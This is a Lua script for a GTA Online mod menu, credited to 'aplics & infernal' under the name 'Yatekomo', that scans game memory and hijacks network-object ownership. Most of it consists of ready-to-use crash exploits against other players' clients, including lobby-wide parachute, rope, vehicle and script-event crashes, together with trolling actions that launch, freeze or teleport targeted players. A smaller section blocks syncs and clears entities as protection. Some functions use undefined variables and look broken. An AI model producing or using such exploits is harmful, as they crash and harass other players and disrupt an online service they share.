-- made by aplics & infernal
util.require_natives("natives-1640181023")

local colors = {
    green = 20,
    red = 23,
    yellow = 190,
    black = 2,
    white = 1,
    gray = 3,
    pink = 201,
    purple = 49, --, 21, 96
    blue = 11
}


local txdDict = "DIA_VICTIM"
local txdName = "DIA_VICTIM"

if filesystem.exists(filesystem.resources_dir() .. "Yatekomo.ytd") then
    util.register_file(filesystem.resources_dir() .. "Yatekomo.ytd")
    txdDict = "Yatekomo"
    txdName = "earth"
end
local function request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
end
local function BlockSyncs(pid, callback)
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "on")
		end
	end
	util.yield(10)
	callback()
	for _, i in ipairs(players.list(false, true, true)) do
		if i ~= pid then
			local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
			menu.trigger_command(outSync, "off")
		end
	end
end
function notification(msg, color)
    if not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) then
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(txdDict)
        while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(txdDict) do
            util.yield()
        end
    end
    HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
    -- HUD.BEGIN_TEXT_COMMAND_THEFEED_POST("STRING")
    -- HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(msg)
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
    HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(txdDict, txdName, true, 15, "Yatekomo", "~c~Notification~s~")
    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
end
notification("Bienvenido!", colors.black)
util.require_natives("natives-1651208000")

local function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

local function log(content)
end

local orgScan = memory.scan

---@param name string
---@param pattern string
---@param callback fun(address: integer)
function memory.scan(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Found " .. name)
        callback(address)
    else
        util.log("Failed to find " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

---@param entity Entity
---@return Player
function get_entity_owner(entity)
    local net_obj = get_net_obj(entity)
    return net_obj ~= NULL and memory.read_byte(net_obj + 0x49) or -1
end

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

memory.scan("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)
memory.scan("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)
memory.scan("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

local function ChangeNetObjOwner(object, player)
    if NETWORK.NETWORK_IS_IN_SESSION() then
        local net_object_mgr = memory.read_long(CNetworkObjectMgr)
        if net_object_mgr == NULL then
            return false
        end
        if not ENTITY.DOES_ENTITY_EXIST(object) then
            return false
        end
        local netObj = get_net_obj(object)
        if netObj == NULL then
            return false
        end
        local net_game_player = GetNetGamePlayer(player)
        if net_game_player == NULL then
            return false
        end
        util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
        return true
    else
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
        return true
    end
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242)) 
end

local function is_player_in_interior(pid)
    return (memory.read_int(memory.script_global(((2689224 + 1) + (pid * 451)) + 242 )) == 0)
end

local get_blip_coords = function(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

local function notification(message, length) 
    if length ~= nil and length > 0 then
        length = length*1000
    else
        length = 3000
    end
end

local function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local time = util.current_time_millis() + 5000
    while not STREAMING.HAS_MODEL_LOADED(hash) and time > util.current_time_millis() do
        STREAMING.REQUEST_MODEL(hash)
        util.yield()
    end
    return STREAMING.HAS_MODEL_LOADED(hash)
end
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
local requestModel = STREAMING.REQUEST_MODEL
local hasModelLoaded = STREAMING.HAS_MODEL_LOADED
local noNeedModel = STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED

local function BadNetVehicleCrash(pid)
    local hashes = {-1041692462}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x+5, pcoords.y+5, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
local function BadNetVehicleCrash3(pid)
    local hashes = {1349725314,-1041692462,-255678177,1591739866}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield()
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

menu.action(menu.my_root(), "Go to Players List", {"ytkgotopl"}, "Shotcut for players list.", function()
    menu.trigger_commands("playerlist")
end)

local LobbyCrash_List = menu.list(menu.my_root(), "Lobby Crashes", {"ytklobbycrashlist"}, "")
menu.divider(LobbyCrash_List, "Yatekomo Lobby Crashes")

menu.toggle_loop(LobbyCrash_List, "Player Parachute Crash", {}, "", function()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local hashes = {util.joaat("prop_beach_parasol_02"), util.joaat("prop_parasol_04c")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, 0, 0, 500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped, 0xFBAB5776, 1000, false)
        util.yield(200)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(ped)
        end
        util.yield(1200)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)
menu.toggle_loop(LobbyCrash_List, "Ruiner Parachute Crash", {}, "", function ()
    local ped = PLAYER.PLAYER_PED_ID()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    RqModel(util.joaat("Ruiner2"))
    local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), pos, 0, true)
    PED.SET_PED_INTO_VEHICLE(ped, Ruiner2, -1)
    local hashes = {util.joaat("prop_beach_parasol_05"), util.joaat("prop_parasol_02")}
    for i = 1, #hashes do
        RqModel(hashes[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, 0, 0, 500, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, hashes[i])
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(1200)
    end
    entities.delete_by_handle(Ruiner2)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped, pos.x, pos.y, pos.z, false, true, true)
end)
menu.action(LobbyCrash_List, "Rope Crash No Notification ", {""}, "", function (pid)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
end)

menu.action(LobbyCrash_List,"R0 Crash", {""} ,"" , function(pid)
    local pos = players.get_position(pid)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    local pos = players.get_position(pid)
    entities.create_vehicle(pos,0X187D938D,0)
end)

menu.toggle_loop(LobbyCrash_List, "Indirect Freemode Crash", {}, "Midnight Destroy SH", function()
    util.trigger_script_event(players.get_script_host() , {1368055548,players.get_script_host(), 0, 1, 0})
end)



menu.action(LobbyCrash_List, "DR Crash", {}, "", function()
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,1349725314,-255678177,-255678177}
    local vehicles = {}
    for i = 1, 20 do
        util.create_thread(function()
            RqModel(hashes[i])
            menu.trigger_commands("anticrashcam on")
            local pcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield(2000)
            end
            vehicles[#vehicles+1] = veh
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            local pos = players.get_position(pid)
            local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
            local pos = players.get_position(pid)
            util.yield(2000)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
            util.yield(2000)
        end)
    end
    util.yield(2000)
    menu.trigger_commands("anticrashcam off")
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end)

protex = menu.list(menu.my_root(), "Protections", {}, "", function() end)

menu.action(protex, "Stop All Sounds", {}, "", function()
    for i = -1, 100 do
        AUDIO.STOP_SOUND(i)
        AUDIO.RELEASE_SOUND_ID(i)
    end
end)

menu.action(protex, "Remove Attachments", {""}, "", function()
    notification("Removing Attachments", colors.black)
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.click_slider(protex,"Clear Entities", {""}, "1 = NPC, 2 = Veh, 3 = Object, 4 = Pickup, 5 = All", 1, 5, 1, 1, function(on_change)
    if on_change == 1 then
        local count = 0
        for k,ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end
        notification(count .. "NPC have been cleared", colors.green)
    end
    if on_change == 2 then
        local count = 0
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end
        notification(count .. "Veh have been Cleared", colors.green)
        return
    end
    if on_change == 3 then
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. "Object have been Cleared", colors.green)
        return
    end
    if on_change == 4 then
        local count = 0
        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. " Pickup have been Cleared", colors.green)
        return
    end
    if on_change == 5 then
        local count = 0
        for k,ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end

        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                entities.delete_by_handle(ent)
                util.yield()
                count = count + 1
            end
        end

        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end

        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
        notification(count .. "All Cleared", colors.green)
        return
    end
end)
menu.action(protex, "Clear Everything", {"cleanse"}, "", function()
    util.toast("Cleaning Area...")
    util.yield(500)
    local entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped) then
            entities.delete_by_handle(ped)
            entitycount += 1
        end
    end
    util.toast("Cleared " .. entitycount .. " Peds")
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(veh) then
            entities.delete_by_handle(veh)
            util.yield()
            entitycount += 1
        end
    end
    util.toast("Cleared ".. entitycount .." Vehicles")
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
        entities.delete_by_handle(object)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Objects")
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(pickup, false, false)
        entities.delete_by_handle(pickup)
        util.yield()
        entitycount += 1
    end
    util.toast("Cleared " .. entitycount .. " Pickups")
    util.toast("Cleansing You Of Skidded Ropes")
    local temp = memory.alloc(4)
    for i = 1, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
        util.yield()
    end
    util.toast("Cleared All Ropes")
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 400, 0)
    util.toast("Cleared All Projectiles")
    util.yield(500)
    util.toast("Area Has Been Cleaned!")
end)
menu.action(protex, "Super cleanse", {"JUST DO IT"}, "", function(on_click)
    local ct = 0
    notification("Working", colors.black)
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)

        ct = ct + 1
    end
    util.toast("Finished")
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)

        end
        ct = ct + 1
    end

end)
menu.divider(protex, "Crash Protections")


menu.toggle(protex, "Toggle Block all Network Events", {}, "Block all network event transmission", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("Toggling block all network events on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("toggling block all network events off...", colors.red)
    end
end)


menu.toggle(protex, "Toggle Block all Incoming Syncs", {}, "", function(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("Toggling block all incoming syncs on... stay safe homie", colors.green)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("toggling block all incoming syncs off...", colors.red)
    end
end)

menu.toggle(protex, "Toggle Block all Outgoing Syncs", {}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling block all outgoing syncs on", colors.green)
        menu.trigger_commands("desyncall on")
    else
        notification("Toggling block all outgoing syncs off", colors.red)
        menu.trigger_commands("desyncall off")
    end
end)

menu.toggle(protex, "Anticrashcam", {"acc"}, "", function(on_toggle)
    if on_toggle then
        notification("Toggling anticrashcam... stay safe homie", colors.green)
        menu.trigger_commands("anticrashcam on")
        menu.trigger_commands("potatomode on")
    else
        notification("Toggling anticrashcam off...", colors.red)
        menu.trigger_commands("anticrashcam off")
        menu.trigger_commands("potatomode off")
    end
end)



menu.toggle(protex, "Panic Mod", {"panic"}, "Stay safe homie", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        notification("toggling panic mode on... stay safe homie", colors.green)
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        notification("toggling panic mode off...", colors.red)
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end)
players.on_join(function(pid)
    local root = menu.player_root(pid)
    menu.divider(root, "Yatekomo")
    local Removals_List = menu.list(root, "Removals", {"ytkcrashlist"}, "")
    local Troll_List = menu.list(root, "Trolling", {"ytktrolling"}, "")
    local Plyrveh_list = menu.list(root, "Vehicle Options", {"ytkvehlist", ""})
    --local Plyrveh_list = menu.list(root, "Vehicle Options", {"ytkvehlist", ""})
    menu.divider(Removals_List, "Yatekomo Removals")
    menu.divider(Troll_List, "Yatekomo Trolling")
    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    menu.action(Plyrveh_list, "Beast Freeze", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        menu.trigger_commands("beast" .. players.get_name(pid))
        repeat 
            util.yield()
        until not ENTITY.IS_ENTITY_VISIBLE(ped) and SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0
        util.spoof_script("am_hunt_the_beast", SCRIPT.TERMINATE_THIS_THREAD)
    end)

    menu.action(Plyrveh_list, "Launch Vehicle Up", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)
    menu.action(Plyrveh_list, "Launch Vehicle Forward", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(Plyrveh_list, "Slingshot Vehicle", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(Plyrveh_list, "Spawn Ramp In Front Of Player", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)
    menu.action(Plyrveh_list, "Teleport under the map", {}, "Teleport them in the void", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        c.z = c.z - 100
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            RequestControl(veh)
            floorcoords = floorcoords - 50
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
        else
            util.toast(players.get_name(pid).. " is not in a vehicle")
        end
    end)
